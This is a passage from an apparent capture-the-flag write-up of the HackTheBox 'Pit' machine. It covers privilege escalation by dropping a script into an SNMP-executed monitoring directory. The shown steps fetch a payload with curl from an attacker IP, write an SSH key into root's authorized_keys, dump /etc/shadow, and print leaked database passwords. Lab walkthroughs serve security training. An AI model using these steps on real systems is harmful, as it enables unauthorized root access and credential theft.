<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;database dbDriver=<span class="string">&quot;mysql&quot;</span> dbHostname=<span class="string">&quot;localhost&quot;</span> dbDatabase=<span class="string">&quot;seeddms&quot;</span> dbUser=<span class="string">&quot;seeddms&quot;</span> dbPass=<span class="string">&quot;ied^ieY6xoquu&quot;</span> doNotCheckVersion=<span class="string">&quot;false&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>MYSQL DB is not accessible to other IPs as it is bound to localhost only. Let’s try these this<br>password with admin&#x2F;root&#x2F;michelle user on “cockpit web console”. I tried these creds to access<br>SSH, but unfortunately SSH is configured to allow only Public-Private keys not password.</p>
<p>and we got user.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[michelle@pit ~]$ <span class="built_in">id</span></span><br><span class="line">uid=1000(michelle) gid=1000(michelle) <span class="built_in">groups</span>=1000(michelle) context=user_u:user_r:user_t:s0</span><br><span class="line">[michelle@pit ~]$ <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">[michelle@pit ~]$ <span class="built_in">cat</span> user.txt</span><br><span class="line">bc22c2a8b56625680ca457a243dd2a84</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1982.jpg"></li>
</ul>
<p>I ran through LinPeas on the machine in search for any paths to escalate privileges, but couldn’t<br>find any.</p>
<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>If we remember SNMP dump we found that there’s a binary file is being run on the machine.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.1.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: /usr/bin/monitor</span><br></pre></td></tr></table></figure>

<p>Let’s check this file out.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[michelle@pit ~]$ file /usr/bin/monitor</span><br><span class="line">/usr/bin/monitor: Bourne-Again shell script, ASCII text executable</span><br><span class="line">[michelle@pit ~]$ <span class="built_in">ls</span> -la /usr/bin/monitor</span><br><span class="line">-rwxr--r--. 1 root root 88 Apr 18  2020 /usr/bin/monitor</span><br></pre></td></tr></table></figure>

<p>It’s an ASCII file and we have permission to read it.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[michelle@pit ~]$ <span class="built_in">cat</span> /usr/bin/monitor </span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> script <span class="keyword">in</span> /usr/local/monitoring/check*sh</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    /bin/bash <span class="variable">$script</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>It’s a script being run from another location. Let’s check that out.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[michelle@pit ~]$ <span class="built_in">ls</span> -la /usr/local/monitoring/</span><br><span class="line"><span class="built_in">ls</span>: cannot open directory <span class="string">&#x27;/usr/local/monitoring/&#x27;</span>: Permission denied</span><br></pre></td></tr></table></figure>

<p>We cannot list content of this directory, let’s check what permission we have for this directory</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[michelle@pit ~]$ <span class="built_in">ls</span> -la /usr/local/</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x. 13 root root 149 Nov  3  2020 .</span><br><span class="line">drwxr-xr-x. 12 root root 144 May 10 05:06 ..</span><br><span class="line">drwxr-xr-x.  2 root root   6 Nov  3  2020 bin</span><br><span class="line">drwxr-xr-x.  2 root root   6 Nov  3  2020 etc</span><br><span class="line">drwxr-xr-x.  2 root root   6 Nov  3  2020 games</span><br><span class="line">drwxr-xr-x.  2 root root   6 Nov  3  2020 include</span><br><span class="line">drwxr-xr-x.  2 root root   6 Nov  3  2020 lib</span><br><span class="line">drwxr-xr-x.  3 root root  17 May 10 05:06 lib64</span><br><span class="line">drwxr-xr-x.  2 root root   6 Nov  3  2020 libexec</span><br><span class="line">drwxrwx---+  2 root root 122 May 21 13:55 monitoring</span><br><span class="line">drwxr-xr-x.  2 root root   6 Nov  3  2020 sbin</span><br><span class="line">drwxr-xr-x.  5 root root  49 Nov  3  2020 share</span><br><span class="line">drwxr-xr-x.  2 root root   6 Nov  3  2020 src</span><br></pre></td></tr></table></figure>

<p>We have read&#x2F;write&#x2F;execute permission for this directory and also + is there, it simply means<br>ACLs are implemented on this directory. In simple terms extended permissions. let’s check the<br>extended permissions.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[michelle@pit ~]$ getfacl /usr/local/monitoring/</span><br><span class="line">getfacl: Removing leading <span class="string">&#x27;/&#x27;</span> from absolute path names</span><br><span class="line"><span class="comment"># file: usr/local/monitoring/</span></span><br><span class="line"><span class="comment"># owner: root</span></span><br><span class="line"><span class="comment"># group: root</span></span><br><span class="line">user::rwx</span><br><span class="line">user:michelle:-wx</span><br><span class="line">group::rwx</span><br><span class="line">mask::rwx</span><br><span class="line">other::---</span><br></pre></td></tr></table></figure>

<p>As you can see, owner is root, other users have full permission but ‘Michelle’ user has only write<br>and execute permission. Let’s try to create a file and find out.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[michelle@pit ~]$ <span class="built_in">echo</span> <span class="string">&quot;test&quot;</span> &gt; /usr/local/monitoring/demo.txt</span><br><span class="line">[michelle@pit ~]$ <span class="built_in">cat</span> /usr/local/monitoring/demo.txt</span><br><span class="line"><span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<p>It worked, we can dump shell file inside this directory and call it via SNMPwalk. First we need to<br>create a shell file with our SSH public keys, upon execution it should copy keys to root’s SSH<br>directory.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[michelle@pit ~]$ curl http://10.10.14.18:82/check.sh -o check.sh</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   598  100   598    0     0    862      0 --:--:-- --:--:-- --:--:--   862</span><br><span class="line">[michelle@pit ~]$ <span class="built_in">cat</span> check.sh </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMR1r7B7aiEe6j+wBsVumAFqFXCiqw2iSrcg1S7rC1BdlVqr8YfWnT6e/e3+TAJk9idtLz/wN2MkupWtI1ddtNTJz31RQb0WMGjq7p8Usg0uIYhQH0PTN/GmPXDhqLIPcbTnNQMcV2PnwM07eXxQH0+s9rqVO8cR2z2f35bKe3WrHNnT7NwfOoWqNJxh+V8OGgfF8LhS0E46I6co76MJAIsX24Zs9r/dY+JPOlJlS3K2Kf3xSfPAScQeWip1WYY9depVuQywk12kOUikzGNjlQ4phNba47VjfycyV34cLw0/vQcDv5hMCfaK+hoE5rBXysnVx/f3n3zRYMLomgveQUCLBYUwJPE2t0VzeeX4W9wxrAOl2Njx5TI4cEFnmlp/6lO/iK+aC6BSBRxU19jS2fUchiN9PMgLSYGzhuIxOLvvd9AlaOYPNM7a5AfjzzO+gd1fv/Mb9EIZCKibtvpHp0eomnSDcDz/b9FNpbvg6V5NBVy2VaufcRbiBDD6cTS00= root@kali&quot;</span> &gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>Now we need to copy this file to monitoring directory.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> check.sh /usr/local/monitoring/</span><br></pre></td></tr></table></figure>

<p>Make sure you can read the file after copying it to monitoring directory.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[michelle@pit ~]$ <span class="built_in">cp</span> check.sh /usr/local/monitoring/</span><br><span class="line">[michelle@pit ~]$ <span class="built_in">cat</span> /usr/local/monitoring/check.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMR1r7B7aiEe6j+wBsVumAFqFXCiqw2iSrcg1S7rC1BdlVqr8YfWnT6e/e3+TAJk9idtLz/wN2MkupWtI1ddtNTJz31RQb0WMGjq7p8Usg0uIYhQH0PTN/GmPXDhqLIPcbTnNQMcV2PnwM07eXxQH0+s9rqVO8cR2z2f35bKe3WrHNnT7NwfOoWqNJxh+V8OGgfF8LhS0E46I6co76MJAIsX24Zs9r/dY+JPOlJlS3K2Kf3xSfPAScQeWip1WYY9depVuQywk12kOUikzGNjlQ4phNba47VjfycyV34cLw0/vQcDv5hMCfaK+hoE5rBXysnVx/f3n3zRYMLomgveQUCLBYUwJPE2t0VzeeX4W9wxrAOl2Njx5TI4cEFnmlp/6lO/iK+aC6BSBRxU19jS2fUchiN9PMgLSYGzhuIxOLvvd9AlaOYPNM7a5AfjzzO+gd1fv/Mb9EIZCKibtvpHp0eomnSDcDz/b9FNpbvg6V5NBVy2VaufcRbiBDD6cTS00= root@kali&quot;</span> &gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>Note: Root is running a clean-up script, the contents of monitoring directory gets removed after<br>5 minutes.</p>
<p>After copying our shell file, now we need to run SNMPwalk application from Kali Linux to<br>execute it remotely.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pit]</span><br><span class="line">└─<span class="comment"># snmpwalk -v 1 -c public pit.htb 1.3.6.1.4.1.8072.1.3.2.2.1.2</span></span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="string">&quot;monitoring&quot;</span> = STRING: /usr/bin/monitor</span><br></pre></td></tr></table></figure>

<p>Note: ‘1.3.6.1.4.1.8072.1.3.2’ is called as OID (Object Identifiers). It is an address used to<br>uniquely identify managed devices and their statuses in a network.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1983.jpg"></li>
</ul>
<p>We can easily match the number for the following numbers 1.3.6.1.4.1 with above SNMP MIB<br>(management information base) tree structure. The following number 8072 is device&#x2F;application<br>manufacturer (netSnmp) and remaining numbers 1.3.2.2.1.2 are part of netExtensions. Below is<br>the complete description of OID.</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.oid-info.com/cgi-bin/display?oid=1.3.6.1.4.1.8072.1.3.2.2.1.2&a=display">OID repository - 1.3.6.1.4.1.8072.1.3.2.2.1.2 &#x3D; {iso(1) identified-organization(3) dod(6)<br>internet(1) private(4) enterprise(1) 8072 netSnmpObjects(1) nsExtensions(3)<br>nsExtendObjects(2) nsExtendConfigTable(2) nsExtendConfigEntry(1) nsExtendCommand(2)}</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;iso(1) identified-organization(3) dod(6) internet(1) private(4) enterprise(1) 8072</span><br><span class="line">netSnmpObjects(1) nsExtensions(3) nsExtendObjects(2) nsExtendConfigTable(2)</span><br><span class="line">nsExtendConfigEntry(1) nsExtendCommand(2)&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZHBzdGVsZS5jb20vc25tcC93aGF0LWRvZXMtb2lkLW5ldHdvcmstZWxlbWVudHMucGhw">What is the SNMP OID? How do you use it?<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.1.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: /usr/</span><br><span class="line">bin/monitor</span><br></pre></td></tr></table></figure>

<p>As you can see the OID value is given for a string and that string is monitor script. When we run<br>SNMPwalk from Kali Linux, on target root runs on behalf to execute those script.</p>
<p>Upon SNMPwalk on OID value, we can SSH into machine and read our root flag.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pit]</span><br><span class="line">└─<span class="comment"># snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects</span></span><br><span class="line">MIB search path: /root/.snmp/mibs:/usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf</span><br><span class="line">Cannot find module (MY-MIB): At line 1 <span class="keyword">in</span> (none)</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class="string">&quot;monitoring&quot;</span> = STRING: /usr/bin/monitor</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendArgs.<span class="string">&quot;monitoring&quot;</span> = STRING: </span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendInput.<span class="string">&quot;monitoring&quot;</span> = STRING: </span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendCacheTime.<span class="string">&quot;monitoring&quot;</span> = INTEGER: 5</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendExecType.<span class="string">&quot;monitoring&quot;</span> = INTEGER: <span class="built_in">exec</span>(1)</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendRunType.<span class="string">&quot;monitoring&quot;</span> = INTEGER: run-on-read(1)</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendStorage.<span class="string">&quot;monitoring&quot;</span> = INTEGER: permanent(4)</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendStatus.<span class="string">&quot;monitoring&quot;</span> = INTEGER: active(1)</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.<span class="string">&quot;monitoring&quot;</span> = STRING: Memory usage</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutputFull.<span class="string">&quot;monitoring&quot;</span> = STRING: Memory usage</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:          3.8Gi       379Mi       3.1Gi       8.0Mi       330Mi       3.2Gi</span><br><span class="line">Swap:         1.9Gi          0B       1.9Gi</span><br><span class="line">Database status</span><br><span class="line">OK - Connection to database successful.</span><br><span class="line">System release info</span><br><span class="line">CentOS Linux release 8.3.2011</span><br><span class="line">SELinux Settings</span><br><span class="line">user</span><br><span class="line"></span><br><span class="line">                Labeling   MLS/       MLS/                          </span><br><span class="line">SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles</span><br><span class="line"></span><br><span class="line">guest_u         user       s0         s0                             guest_r</span><br><span class="line">root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r</span><br><span class="line">staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r</span><br><span class="line">sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r</span><br><span class="line">system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r</span><br><span class="line">unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r</span><br><span class="line">user_u          user       s0         s0                             user_r</span><br><span class="line">xguest_u        user       s0         s0                             xguest_r</span><br><span class="line">login</span><br><span class="line"></span><br><span class="line">Login Name           SELinux User         MLS/MCS Range        Service</span><br><span class="line"></span><br><span class="line">__default__          unconfined_u         s0-s0:c0.c1023       *</span><br><span class="line">michelle             user_u               s0                   *</span><br><span class="line">root                 unconfined_u         s0-s0:c0.c1023       *</span><br><span class="line">System <span class="built_in">uptime</span></span><br><span class="line"> 14:30:54 up  2:26,  1 user,  load average: 0.00, 0.00, 0.00</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutNumLines.<span class="string">&quot;monitoring&quot;</span> = INTEGER: 31</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendResult.<span class="string">&quot;monitoring&quot;</span> = INTEGER: 0</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.1 = STRING: Memory usage</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.2 = STRING:               total        used        free      shared  buff/cache   available</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.3 = STRING: Mem:          3.8Gi       379Mi       3.1Gi       8.0Mi       330Mi       3.2Gi</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.4 = STRING: Swap:         1.9Gi          0B       1.9Gi</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.5 = STRING: Database status</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.6 = STRING: OK - Connection to database successful.</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.7 = STRING: System release info</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.8 = STRING: CentOS Linux release 8.3.2011</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.9 = STRING: SELinux Settings</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.10 = STRING: user</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.11 = STRING: </span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.12 = STRING:                 Labeling   MLS/       MLS/                          </span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.13 = STRING: SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.14 = STRING: </span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.15 = STRING: guest_u         user       s0         s0                             guest_r</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.16 = STRING: root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.17 = STRING: staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.18 = STRING: sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.19 = STRING: system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.20 = STRING: unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.21 = STRING: user_u          user       s0         s0                             user_r</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.22 = STRING: xguest_u        user       s0         s0                             xguest_r</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.23 = STRING: login</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.24 = STRING: </span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.25 = STRING: Login Name           SELinux User         MLS/MCS Range        Service</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.26 = STRING: </span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.27 = STRING: __default__          unconfined_u         s0-s0:c0.c1023       *</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.28 = STRING: michelle             user_u               s0                   *</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.29 = STRING: root                 unconfined_u         s0-s0:c0.c1023       *</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.30 = STRING: System <span class="built_in">uptime</span></span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.31 = STRING:  14:31:07 up  2:26,  1 user,  load average: 0.00, 0.00, 0.00</span><br><span class="line">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="string">&quot;monitoring&quot;</span>.31 = No more variables left <span class="keyword">in</span> this MIB View (It is past the end of the MIB tree)</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pit]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa root@10.10.10.241                                                      </span></span><br><span class="line">Web console: https://pit.htb:9090/</span><br><span class="line"></span><br><span class="line">Last login: Mon May 10 11:42:46 2021</span><br><span class="line">[root@pit ~]<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br><span class="line">[root@pit ~]<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">[root@pit ~]<span class="comment"># cat root.txt </span></span><br><span class="line">cfcabb6990fb551b2b4627fb4e786946</span><br><span class="line">[root@pit ~]<span class="comment"># cat /etc/shadow | grep root</span></span><br><span class="line">root:$6$4ZnZ0Iv3NzFIZtKa<span class="variable">$tA78wgAwaBBSg96ecMRPYIogQmANo</span>/9pJhHmf06bCmbKukMDM9rdT2Mdc6UhwD1raDzXIrk.zjQ9lkJIoLShE.:18757:0:99999:7:::</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1984.jpg"></li>
</ul>
<h3 id="Cleanup-Script"><a href="#Cleanup-Script" class="headerlink" title="Cleanup Script"></a>Cleanup Script</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@pit ~]<span class="comment"># cat cleanup.sh </span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove attached files (keep &quot;Upgrade Note&quot;)</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> `/usr/bin/find /var/www/html/seeddms51x/data/1048576/ -mindepth 1 -<span class="built_in">type</span> d -mmin +5 -not -name 21`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">rm</span> -rf <span class="variable">$d</span></span><br><span class="line">  <span class="built_in">id</span>=<span class="variable">$&#123;d##*/&#125;</span></span><br><span class="line">  /usr/bin/mysql -u root -p<span class="string">&#x27;ek)aizee^FaiModa~ce]z6c&#x27;</span> seeddms &lt;&lt;<span class="string">DELETE_QUERY</span></span><br><span class="line"><span class="string">DELETE FROM tblDocumentContent where id = $id;</span></span><br><span class="line"><span class="string">DELETE FROM tblDocuments where id = $id;</span></span><br><span class="line"><span class="string">DELETE_QUERY</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Restore monitoring scripts</span></span><br><span class="line">/usr/bin/rm -rf /usr/local/monitoring/*</span><br><span class="line">/usr/bin/cp /root/monitoring/* /usr/local/monitoring</span><br><span class="line">/usr/bin/chmod 700 /usr/local/monitoring/*</span><br><span class="line"></span><br><span class="line"><span class="comment"># Clean /tmp directory</span></span><br><span class="line">/usr/bin/rm -rf /tmp/*</span><br><span class="line"></span><br><span class="line"><span class="comment"># Restart php-fpm</span></span><br><span class="line">/usr/bin/systemctl restart php-fpm.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># Clean authorized_keys</span></span><br><span class="line">&gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
<li>snmp information gathering</li>
<li>SeedDMS versions &lt; 5.1.11 - Remote Command Execution</li>
<li>MYSQL creds leak in settings.xml</li>
<li>to get shell script excecute by SNMP OID</li>
<li>Permission misconfiguration privesclation</li>
</ul>
<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
